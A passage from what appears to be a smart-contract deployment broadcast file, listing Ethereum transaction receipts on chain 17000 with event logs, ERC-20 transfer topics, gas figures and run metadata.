            "0x00000000000000000000000056dd51c27325f54b7d3d4c468a16560981380a43",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6"
          ],
          "data": "0x00000000000000000000000000000000000000000000000014d1120d7b160096",
          "blockHash": "0x00d4dfa1784873cc5d9a98e3718b2fe28568b3affa3758d73ef0f56c8aceb679",
          "blockNumber": "0x2d5218",
          "blockTimestamp": "0x676477d4",
          "transactionHash": "0xbbb1d73a0dac9329db75a07dc13a6bc2d11440e5e50b796f7ba8554ff32e37bf",
          "transactionIndex": "0xa",
          "logIndex": "0x33",
          "removed": false
        },
        {
          "address": "0xf35110f68f441fd3bd7d354a2a5faa1d32b970a7",
          "topics": [
            "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
            "0x0000000000000000000000000000000000000000000000000000000000000000",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6"
          ],
          "data": "0x00000000000000000000000000000000000000000000000014d1120d7b160096",
          "blockHash": "0x00d4dfa1784873cc5d9a98e3718b2fe28568b3affa3758d73ef0f56c8aceb679",
          "blockNumber": "0x2d5218",
          "blockTimestamp": "0x676477d4",
          "transactionHash": "0xbbb1d73a0dac9329db75a07dc13a6bc2d11440e5e50b796f7ba8554ff32e37bf",
          "transactionIndex": "0xa",
          "logIndex": "0x34",
          "removed": false
        }
      ],
      "logsBloom": "0x04002000000010000000000000000000000000000000000000000000000000400000000000000000000000000000000000000040000000000010000000800000140000000000000010008008000000000400000000000000000000100000000000020000020000401000400080400801000000400000000000018018000000000800000000200000000400000000000000000002000000000000000080004000000000000100000000080100000000000000000000000000000010002000000000001002000000400000000000000020000000000000000000002000000020002800000004000000000000000000000000000000008000020000000008200008",
      "type": "0x2",
      "transactionHash": "0xbbb1d73a0dac9329db75a07dc13a6bc2d11440e5e50b796f7ba8554ff32e37bf",
      "transactionIndex": "0xa",
      "blockHash": "0x00d4dfa1784873cc5d9a98e3718b2fe28568b3affa3758d73ef0f56c8aceb679",
      "blockNumber": "0x2d5218",
      "gasUsed": "0x3ffea",
      "effectiveGasPrice": "0xe4e1cd",
      "from": "0xe88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
      "to": "0xf7336fd84911203f1f01ab6803eccc984700f591",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x1a646f",
      "logs": [
        {
          "address": "0x56dd51c27325f54b7d3d4c468a16560981380a43",
          "topics": [
            "0x06b541ddaa720db2b10a4d0cdac39b8d360425fc073085fac19bc82614677987",
            "0x000000000000000000000000f3554197c2772c2c597abc5e192481139e606883",
            "0x000000000000000000000000f3554197c2772c2c597abc5e192481139e606883",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6"
          ],
          "data": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
          "blockHash": "0x00d4dfa1784873cc5d9a98e3718b2fe28568b3affa3758d73ef0f56c8aceb679",
          "blockNumber": "0x2d5218",
          "blockTimestamp": "0x676477d4",
          "transactionHash": "0x54b4768f1068753cd508ef1a1a417395fa7a30a7dba5e6bdc32260346740e03a",
          "transactionIndex": "0xb",
          "logIndex": "0x35",
          "removed": false
        },
        {
          "address": "0x56dd51c27325f54b7d3d4c468a16560981380a43",
          "topics": [
            "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
            "0x000000000000000000000000f3554197c2772c2c597abc5e192481139e606883",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6"
          ],
          "data": "0x0000000000000000000000000000000000000000000000000000000000000000",
          "blockHash": "0x00d4dfa1784873cc5d9a98e3718b2fe28568b3affa3758d73ef0f56c8aceb679",
          "blockNumber": "0x2d5218",
          "blockTimestamp": "0x676477d4",
          "transactionHash": "0x54b4768f1068753cd508ef1a1a417395fa7a30a7dba5e6bdc32260346740e03a",
          "transactionIndex": "0xb",
          "logIndex": "0x36",
          "removed": false
        }
      ],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000400000000000000000000000000000000000000000000000000000000000000000000400000000000000010000000000000000000000000000000000000000000000002000000000000000080000000000000000100000000080000000000000000000000000000000010002000000000001002000000000000000000000000000000000000000000002000000000000000000004000000000000000000000000000000000000020000000000000000",
      "type": "0x2",
      "transactionHash": "0x54b4768f1068753cd508ef1a1a417395fa7a30a7dba5e6bdc32260346740e03a",
      "transactionIndex": "0xb",
      "blockHash": "0x00d4dfa1784873cc5d9a98e3718b2fe28568b3affa3758d73ef0f56c8aceb679",
      "blockNumber": "0x2d5218",
      "gasUsed": "0xc307",
      "effectiveGasPrice": "0xe4e1cd",
      "from": "0xe88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
      "to": "0xf3554197c2772c2c597abc5e192481139e606883",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x1ca14a",
      "logs": [
        {
          "address": "0xe79206ea5f8ed1a5281a812d8864f5b3207c9441",
          "topics": [
            "0x44b4f910eed5395f84d00285781e37020302f8ae9b632209b4c3eafe05bd2e87",
            "0x000000000000000000000000f35110f68f441fd3bd7d354a2a5faa1d32b970a7",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6"
          ],
          "data": "0x0000000000000000000000000000000000000000000000001f399b1438a100e1",
          "blockHash": "0x00d4dfa1784873cc5d9a98e3718b2fe28568b3affa3758d73ef0f56c8aceb679",
          "blockNumber": "0x2d5218",
          "blockTimestamp": "0x676477d4",
          "transactionHash": "0xddfbbeda9b1802b8e5e3877a4202026783fb17ec5309bad4108775d217dde98a",
          "transactionIndex": "0xc",
          "logIndex": "0x37",
          "removed": false
        },
        {
          "address": "0xf35110f68f441fd3bd7d354a2a5faa1d32b970a7",
          "topics": [
            "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
            "0x0000000000000000000000000000000000000000000000000000000000000000"
          ],
          "data": "0x0000000000000000000000000000000000000000000000001f399b1438a100e1",
          "blockHash": "0x00d4dfa1784873cc5d9a98e3718b2fe28568b3affa3758d73ef0f56c8aceb679",
          "blockNumber": "0x2d5218",
          "blockTimestamp": "0x676477d4",
          "transactionHash": "0xddfbbeda9b1802b8e5e3877a4202026783fb17ec5309bad4108775d217dde98a",
          "transactionIndex": "0xc",
          "logIndex": "0x38",
          "removed": false
        },
        {
          "address": "0xe79206ea5f8ed1a5281a812d8864f5b3207c9441",
          "topics": [
            "0xbe89fbc5edbebf243cf8cf7946ce755357087079003d51a4eb7c69e987bf0801",
            "0x0000000000000000000000000000000000000000000000000000000000000001",
            "0x000000000000000000000000f7336fd84911203f1f01ab6803eccc984700f591",
            "0x000000000000000000000000e79206ea5f8ed1a5281a812d8864f5b3207c9441"
          ],
          "data": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000648a9d3fcf00000000000000000000000056dd51c27325f54b7d3d4c468a16560981380a43000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc60000000000000000000000000000000000000000000000001f399b1438a100e100000000000000000000000000000000000000000000000000000000",
          "blockHash": "0x00d4dfa1784873cc5d9a98e3718b2fe28568b3affa3758d73ef0f56c8aceb679",
          "blockNumber": "0x2d5218",
          "blockTimestamp": "0x676477d4",
          "transactionHash": "0xddfbbeda9b1802b8e5e3877a4202026783fb17ec5309bad4108775d217dde98a",
          "transactionIndex": "0xc",
          "logIndex": "0x39",
          "removed": false
        },
        {
          "address": "0xe79206ea5f8ed1a5281a812d8864f5b3207c9441",
          "topics": [
            "0x4641df4a962071e12719d8c8c8e5ac7fc4d97b927346a3d7a335b1f7517e133c",
            "0xefcd20e80917df09f5211566218c859289441201316ef517398426f216955349"
          ],
          "data": "0x",
          "blockHash": "0x00d4dfa1784873cc5d9a98e3718b2fe28568b3affa3758d73ef0f56c8aceb679",
          "blockNumber": "0x2d5218",
          "blockTimestamp": "0x676477d4",
          "transactionHash": "0xddfbbeda9b1802b8e5e3877a4202026783fb17ec5309bad4108775d217dde98a",
          "transactionIndex": "0xc",
          "logIndex": "0x3a",
          "removed": false
        },
        {
          "address": "0xf7336fd84911203f1f01ab6803eccc984700f591",
          "topics": [
            "0x44b4f910eed5395f84d00285781e37020302f8ae9b632209b4c3eafe05bd2e87",
            "0x00000000000000000000000056dd51c27325f54b7d3d4c468a16560981380a43",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6"
          ],
          "data": "0x0000000000000000000000000000000000000000000000001f399b1438a100e1",
          "blockHash": "0x00d4dfa1784873cc5d9a98e3718b2fe28568b3affa3758d73ef0f56c8aceb679",
          "blockNumber": "0x2d5218",
          "blockTimestamp": "0x676477d4",
          "transactionHash": "0xddfbbeda9b1802b8e5e3877a4202026783fb17ec5309bad4108775d217dde98a",
          "transactionIndex": "0xc",
          "logIndex": "0x3b",
          "removed": false
        },
        {
          "address": "0x56dd51c27325f54b7d3d4c468a16560981380a43",
          "topics": [
            "0x06b541ddaa720db2b10a4d0cdac39b8d360425fc073085fac19bc82614677987",
            "0x000000000000000000000000f7336fd84911203f1f01ab6803eccc984700f591",
            "0x000000000000000000000000f7336fd84911203f1f01ab6803eccc984700f591",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6"
          ],
          "data": "0x0000000000000000000000000000000000000000000000001f399b1438a100e10000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
          "blockHash": "0x00d4dfa1784873cc5d9a98e3718b2fe28568b3affa3758d73ef0f56c8aceb679",
          "blockNumber": "0x2d5218",
          "blockTimestamp": "0x676477d4",
          "transactionHash": "0xddfbbeda9b1802b8e5e3877a4202026783fb17ec5309bad4108775d217dde98a",
          "transactionIndex": "0xc",
          "logIndex": "0x3c",
          "removed": false
        },
        {
          "address": "0x56dd51c27325f54b7d3d4c468a16560981380a43",
          "topics": [
            "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
            "0x000000000000000000000000f7336fd84911203f1f01ab6803eccc984700f591",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6"
          ],
          "data": "0x0000000000000000000000000000000000000000000000001f399b1438a100e1",
          "blockHash": "0x00d4dfa1784873cc5d9a98e3718b2fe28568b3affa3758d73ef0f56c8aceb679",
          "blockNumber": "0x2d5218",
          "blockTimestamp": "0x676477d4",
          "transactionHash": "0xddfbbeda9b1802b8e5e3877a4202026783fb17ec5309bad4108775d217dde98a",
          "transactionIndex": "0xc",
          "logIndex": "0x3d",
          "removed": false
        }
      ],
      "logsBloom": "0x00000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004000000000010000000840000140000000000000010008008000000000000000000040000000000100000000000020000020000401000000080400801000000400000000000008018000000000000000000200000000400000000000000000002000000000000000080004000000000000100000000000000000000000000000000000020000010000000000000001102002000400000000000000020000000000000001000002000000060002800000004000000800000000000000000000000000000020000000008200008",
      "type": "0x2",
      "transactionHash": "0xddfbbeda9b1802b8e5e3877a4202026783fb17ec5309bad4108775d217dde98a",
      "transactionIndex": "0xc",
      "blockHash": "0x00d4dfa1784873cc5d9a98e3718b2fe28568b3affa3758d73ef0f56c8aceb679",
      "blockNumber": "0x2d5218",
      "gasUsed": "0x23cdb",
      "effectiveGasPrice": "0xe4e1cd",
      "from": "0xe88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
      "to": "0xe79206ea5f8ed1a5281a812d8864f5b3207c9441",
      "contractAddress": null
    }
  ],
  "libraries": [],
  "pending": [],
  "returns": {},
  "timestamp": 1734637526,
  "chain": 17000,
  "commit": "58111ea"
}